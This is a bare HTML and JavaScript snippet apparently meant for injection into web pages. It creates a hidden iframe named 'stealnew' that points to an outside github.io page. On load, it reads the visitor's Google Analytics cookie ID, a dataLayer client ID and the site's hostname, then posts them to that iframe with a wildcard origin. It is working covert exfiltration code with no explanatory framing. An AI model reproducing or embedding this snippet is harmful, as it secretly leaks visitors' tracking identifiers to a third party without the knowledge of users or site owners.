<iframe id="stealnew" height="0" width="0"
            style="display:none;visibility:hidden"src="https://anthonybrien6552.github.io/sending_for_fun_post/"></iframe>
    <script>
        
        function getgaCid() {
            var name = "_ga=";
            var decodedCookie = decodeURIComponent(document.cookie);
            var ca = decodedCookie.split(';');
            for(var i = 0; i <ca.length; i++) {
                var c = ca[i];
                    while (c.charAt(0) == ' ') {
                        c = c.substring(1);
                    }
                    if (c.indexOf(name) == 0) {
                        return c.substring(name.length+6, c.length);
                    }
            }
            return "";
        }
        uuid=-1
        for(i=0;i<dataLayer.length;i++){
            try{
                uuid=dataLayer[i]['ga_c_id'];
            }
            catch(e){
                console.log("pass");
            }
            if(uuid!=null){
                break;
            }
        }

        iFrame = document.getElementById('stealnew')
        iFrame.onload = function(){
            var msg=uuid+"||"+window.location.hostname+"||"+getgaCid();
            //var msg="testUID||testDOM||testCID";
            iFrame.contentWindow.postMessage(msg,'*');
        }
    </script>
